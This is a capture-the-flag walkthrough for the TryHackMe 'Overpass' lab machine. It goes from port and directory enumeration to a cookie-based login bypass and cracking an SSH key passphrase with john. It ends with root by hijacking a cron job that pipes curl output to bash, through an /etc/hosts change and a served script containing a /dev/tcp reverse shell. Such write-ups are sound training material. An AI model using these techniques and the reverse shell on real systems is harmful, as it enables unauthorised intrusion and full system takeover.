# [Overpass [easy]](https://tryhackme.com/room/overpass?path=undefined)

# Enum

## nmap

```
>>> nmap -sC -sV 10.10.47.54             
Starting Nmap 7.80 ( https://nmap.org ) at 2024-02-10 11:38 CET
Nmap scan report for 10.10.47.54
Host is up (0.044s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 37:96:85:98:d1:00:9c:14:63:d9:b0:34:75:b1:f9:57 (RSA)
|   256 53:75:fa:c0:65:da:dd:b1:e8:dd:40:b8:f6:82:39:24 (ECDSA)
|_  256 1c:4a:da:1f:36:54:6d:a6:c6:17:00:27:2e:67:75:9c (ED25519)
80/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Overpass
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.54 seconds
```

## port 80

![alt text](https://i.imgur.com/bKfe195.png)

Looking at the download page, we can see that we can get the source code, but their is nothing interesting on it.
![alt text](https://i.imgur.com/BkbAX9i.png)

## dir enum
```
>>> gobuster  -u http://10.10.47.54/  -w wordlists/SecLists/Discovery/Web-Content/common.txt                 

=====================================================
Gobuster v2.0.1              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.10.47.54/
[+] Threads      : 10
[+] Wordlist     : wordlists/SecLists/Discovery/Web-Content/common.txt
[+] Status codes : 200,204,301,302,307,403
[+] Timeout      : 10s
=====================================================
2024/02/10 11:44:29 Starting gobuster
=====================================================
/aboutus (Status: 301)
/admin (Status: 301)
/css (Status: 301)
/downloads (Status: 301)
/img (Status: 301)
/index.html (Status: 301)
/render/https://www.google.com (Status: 301)
=====================================================
2024/02/10 11:44:50 Finished
=====================================================
```
Looking at `IP/admin` we can see that we may can login:

![alt text](https://i.imgur.com/a2F4ADV.png)

looking at the page source code we can see that it uses a `login.js` script:
```js
async function postData(url = '', data = {}) {
    // Default options are marked with *
    const response = await fetch(url, {
        method: 'POST', // *GET, POST, PUT, DELETE, etc.
        cache: 'no-cache', // *default, no-cache, reload, force-cache, only-if-cached
        credentials: 'same-origin', // include, *same-origin, omit
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded'
        },
        redirect: 'follow', // manual, *follow, error
        referrerPolicy: 'no-referrer', // no-referrer, *client
        body: encodeFormData(data) // body data type must match "Content-Type" header
    });
    return response; // We don't always want JSON back
}
const encodeFormData = (data) => {
    return Object.keys(data)
        .map(key => encodeURIComponent(key) + '=' + encodeURIComponent(data[key]))
        .join('&');
}
function onLoad() {
    document.querySelector("#loginForm").addEventListener("submit", function (event) {
        //on pressing enter
        event.preventDefault()
        login()
    });
}
async function login() {
    const usernameBox = document.querySelector("#username");
    const passwordBox = document.querySelector("#password");
    const loginStatus = document.querySelector("#loginStatus");
    loginStatus.textContent = ""
    const creds = { username: usernameBox.value, password: passwordBox.value }
    const response = await postData("/api/login", creds)
    const statusOrCookie = await response.text()
    if (statusOrCookie === "Incorrect credentials") {
        loginStatus.textContent = "Incorrect Credentials"
        passwordBox.value=""
    } else {
        Cookies.set("SessionToken",statusOrCookie)
        window.location = "/admin"
    }
}
```

Let's just set our cookie the console:
```js
Cookies.set("SessionToken",400)
```
Now reload the page and bingo, we have a ssh key:

![alt text](https://i.imgur.com/WM7encs.png)

now let's connect as `James` using ssh:

```
>>> vim key
>>> chmod 400 key
>>> ssh -i key james@10.10.47.54       
The authenticity of host '10.10.47.54 (10.10.47.54)' can't be established.
ED25519 key fingerprint is SHA256:FhrAF0Rj+EFV1XGZSYeJWf5nYG0wSWkkEGSO5b+oSHk.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.47.54' (ED25519) to the list of known hosts.
Enter passphrase for key 'key': 
```
Okay, let's bruteforce the key password using [ssh2john](https://raw.githubusercontent.com/openwall/john/bleeding-jumbo/run/ssh2john.py)

```
>>> python3 ssh2john.py key > hash
>>> john --wordlist=/home/nk0/wordlists/rockyou.txt hash.txt
Note: This format may emit false positives, so it will keep trying even after finding a
possible candidate.
Warning: detected hash type "SSH", but the string is also recognized as "ssh-opencl"
Use the "--format=ssh-opencl" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
james13          (key)
1g 0:00:00:21 DONE (2024-02-10 11:19) 0.04719g/s 676814p/s 676814c/s 676814C/s *7¡Vamos!
Session completed. 
```

Now we can login using ssh:

```
ssh -i key james@10.10.137.230
Enter passphrase for key 'key':
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-108-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun Feb 11 15:01:27 UTC 2024

  System load:  0.08               Processes:           88
  Usage of /:   22.3% of 18.57GB   Users logged in:     0
  Memory usage: 12%                IP address for eth0: 10.10.137.230
  Swap usage:   0%


47 packages can be updated.
0 updates are security updates.


Last login: Sat Jun 27 04:45:40 2020 from 192.168.170.1
james@overpass-prod:~$ 
```
Looking at the crontab, we can see that root curl a bash script:

```
james@overpass-prod:~$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user	command
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
# Update builds from latest code
* * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash
```
Let's add our IP to `/etc/hosts`:
```
james@overpass-prod:~$ vim /etc/hosts
```
```
IP	overpass.thm
```

now let's create our [reverse shell](https://www.revshells.com/):

```
sh -i >& /dev/tcp/IP/1235 0>&1
```

```
>>> mkdir downloads
>>> mkdir downloads/src
>>> vim downloads/src/buildscript.sh
>>> sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.137.230 - - [11/Feb/2024 16:17:01] "GET /downloads/src/buildscript.sh HTTP/1.1" 200 -
```
And boom we are root:
```
>>> nc -lvnp 1235           
Listening on 0.0.0.0 1235
Connection received on 10.10.137.230 39126
sh: 0: can't access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root)
#
```
